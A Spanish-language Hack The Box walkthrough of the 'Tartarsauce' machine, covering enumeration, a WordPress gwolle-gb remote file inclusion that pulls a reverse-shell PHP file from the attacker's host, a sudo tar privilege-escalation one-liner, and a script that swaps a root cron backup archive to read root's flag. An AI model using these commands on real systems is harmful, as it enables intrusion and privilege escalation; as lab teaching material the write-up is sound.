---
title: "Tartarsauce - WriteUp"
date: Thu Jan 30 2025 13:15:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, dirb, wordpress, exploit, gobuster, bash, privesc, php]
image: /assets/img/htb-writeups/Pasted-image-20240213110350.png
---

{% include machine-info.html
  machine="Tartarsauce"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}

![Tartarsauce](/assets/img/htb-writeups/Pasted-image-20240213110350.png)

---

---
------

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213110350.png)

Acerca de la salsa tártara

TartarSauce es un cuadro bastante desafiante que resalta la importancia de una enumeración remota amplia en lugar de centrarse en vectores de ataque obvios pero potencialmente menos fructíferos. Presenta una escalada de privilegios bastante realista que requiere abusos del comando tar. La atención al detalle al revisar el resultado de la herramienta es beneficiosa al probar esta máquina.

Skills:

- RFI (Remote File Inclusion) - Abusing Wordpress Plugin [Gwolle-gb]
- RFI to RCE (Creating our malicious PHP file)

- Abusing Sudoers Privilege (Tar Command)
- Abusing Cron Job (Privilege Escalation) [Code Analysis] [Bash Scripting]

---------

#### ENUM

NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Feb 13 11:05:51 2024 as: nmap -sCV -p 80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xs
l -oN targeted -oX targetedXML 10.129.1.185
Nmap scan report for 10.129.1.185
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Landing Page
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
```

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213111714.png)

ROBOTS.TXT
```HTTP
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213111925.png)

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213112118.png)

Probamos con admin/admin y entramos...

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213112312.png)

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213112331.png)

Con todos estos datos y al estar autenticados vamos a buscar un exploit que nos pueda dar acceso a la máquina.

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213113837.png)

Intento unos cuantos exploit más pero parecen no funcionar. Vamosa enumerar más por si encontramos algo que en principio no hemos visto.
Parece un rabbit hole...

FUZZING

```bash
gobuster dir -u 'http://10.129.1.185' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 --no-error --add-slash

/icons/               (Status: 403) [Size: 293]
/webservices/         (Status: 403) [Size: 299]
/server-status/       (Status: 403) [Size: 301]
```

```bash
gobuster dir -u 'http://10.129.1.185/webservices' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 --no-error --add-slash

/wp/                  (Status: 200) [Size: 11237]
```

Descubrimos que tiene una ruta de WordPress, vamos a seguir por esta vía.

Tenemos que añadir el dominio tartarsauce.htb porque el  propio WordPres intenta un redirección.

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213125054.png)

Y efectivamente, tenemos un WordPress.

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213125228.png)

#### EXPLOTACIÓN

Pasamos WPSCAN

```shell
$ wpscan --url http://tartarsauce.htb/webservices/wp/ --enumerate ap,u,t --api-token=$WPSCAN --force
```

```bash
...
[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.
[i] User(s) Identified:
[+] wpadmin
...
```

Vamos a asegurarnos de que no existen plugins porque no me lo creo.

```bash
$ nmap -p80 tartarsauce.htb --script http-wordpress-enum --script-args http-wordpress-enum.root='/webservices/wp',search-limit=1000

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 1000 themes/plugins
|   themes
|     twentyfifteen 1.9
|     twentysixteen 1.4
|     twentyseventeen 1.4
|   plugins
|     akismet 4.0.3
|_    gwolle-gb 2.3.10
```

Pues al final sí que tenía plugins, para fiarte de WPSCAN...

Vamos a buscar si podemos explotarlos.

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213133738.png)

Tenemos un RFI que consiste en lo siguiente:

```http
El parámetro HTTP GET "abspath" no se desinfecta adecuadamente antes de usarse en la función PHP require(). Un atacante remoto puede incluir un archivo llamado 'wp-load.php' desde un servidor remoto arbitrario y ejecutar su contenido en el servidor web vulnerable. Para hacerlo, el atacante debe colocar un archivo malicioso 'wp-load.php' en la raíz de documentos de su servidor e incluir la URL del servidor en la solicitud:

http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

Ok pues vamos a crear un archivo malicioso PHP que nos de una reverse shell y lo renombraremos a _wp-load.php_ y lo compartiremos desde nuestra máquina con un servidor http simple con Python.

Nos ponemos a la escucha por el puerto que hayamos configurado en el archivo PHP y escribimos la siguiente URL en el navegador:

```http
http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.87/
```

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213134907.png)

Y padentro... Yo he usado penelope como listener pero se puede usar NetCat tranquilamente...

#### MOVIMIENTO LATERAL

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213135251.png)

Vemos que el usuario _onuma_ puede ejecutar como root el binario /bin/tar. Es un vector fácil de explotar.

Vamos a escalar al usuario onuma de la manera que nos ofrece _GTFObins_ https://gtfobins.github.io/gtfobins/tar/#sudo:

```bash
$ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213161651.png)

Pues ya somo _onuma_...

Registramos bandera y seguimos.

#### ESCALADA

Pasamos el PSPY y nos muestra esto:

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213164839.png)

El usuario root ejecuta una tarea con el script o binario _backuperer_ y luego lo borra.

Vamos a ver qué hace ese script.

```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Analicemos este script paso a paso (generado por IA):

1. **Encabezado y comentarios**:
    
    - El script comienza con `#!/bin/bash`, que indica que se ejecutará en el intérprete de comandos Bash.
    - A continuación, hay una serie de comentarios que proporcionan información sobre el propósito y la versión del script.
2. **Variables**:
    
    - Se definen varias variables:
        - `basedir`: Ruta al directorio raíz de la aplicación web.
        - `bkpdir`: Ruta al directorio de copias de seguridad.
        - `tmpdir`: Ruta al directorio temporal.
        - `testmsg` y `errormsg`: Archivos de texto para mensajes de prueba y errores.
        - `tmpfile`: Nombre de archivo temporal generado aleatoriamente.
        - `check`: Directorio de verificación.

3. **Función `printbdr`**:
    
    - Define una función llamada `printbdr` que imprime un borde de guiones en la consola.
4. **Creación de un archivo de prueba**:
    
    - Se crea un archivo de prueba llamado `onuma_backup_test.txt` que registra la última vez que se ejecutó la copia de seguridad.
5. **Limpieza previa**:
    
    - Se eliminan archivos temporales y el directorio de verificación de la ejecución anterior.
6. **Copia de seguridad de los archivos de desarrollo del sitio web “onuma”**:
    
    - Se crea un archivo comprimido (tar) que contiene los archivos del directorio raíz de la aplicación web.
    - Se utiliza `sudo` para ejecutar el comando como el usuario “onuma”.
7. **Espera para completar la copia de seguridad**:
    
    - Se agrega un retraso de 30 segundos para esperar a que la copia de seguridad se complete, especialmente si hay archivos grandes.
8. **Verificación de integridad de la copia de seguridad**:
    
    - Se define la función `integrity_chk` que compara los archivos en el directorio raíz de la aplicación web con los archivos en el directorio de verificación.
    - Si hay diferencias, se registra un error en el archivo de errores.
9. **Finalización del proceso**:
    
    - Si no hay errores de integridad, se mueve el archivo temporal a la ubicación de la copia de seguridad final.
    - Se eliminan los archivos temporales y el directorio de verificación.

En resumen, este script realiza una copia de seguridad de los archivos de desarrollo de la aplicación web “onuma”, verifica su integridad y guarda la copia de seguridad en un directorio específico. Es importante tener en cuenta que este script debe ejecutarse con precaución, ya que tiene acceso a archivos importantes y puede afectar la integridad del sistema.

AHORA EL CAMBIAZO...

Creamos un script que capture el nombre del archivo generado comprimido del backup y lo cambiamos por uno nuestro que tiene dentro un enlace simbólico de /root/root.txt > index.html lo volvemos a comprimir y lo subimos en la carpeta donde ejecutemos este script:

```bash
#!/bin/bash

function ctrl_c() {
    echo -e "\n\n[+] Saliendo...\n"
    exit 1
}

trap ctrl_c INT

echo -e "[+] Leyendo el directorio /var/tmp/..."
while true; do
    filename="$(ls -la /var/tmp/ | grep -oP '\.\w{40}')"
    if [ -n "$filename" ]; then
        echo -e "\n[+] El archivo se ha encontrado: $filename\n"
        rm -f /var/tmp/$filename
        cp webpacked.tar /var/tmp/$filename
        echo -e "[+] Se ha copiado el archivo 'webpacked.tar' al directorio '/var/tmp/'\n"
        exit 0
    fi
    sleep 1  # Espera 1 segundo antes de volver a verificar
done
```

Esperamos dos minutos y visualizamos el contenido del archivo /var/backups/onuma_backup_error.txt

![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213192301.png)

Máquina conseguida!
---

**Última actualización**: 2025-01-30<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
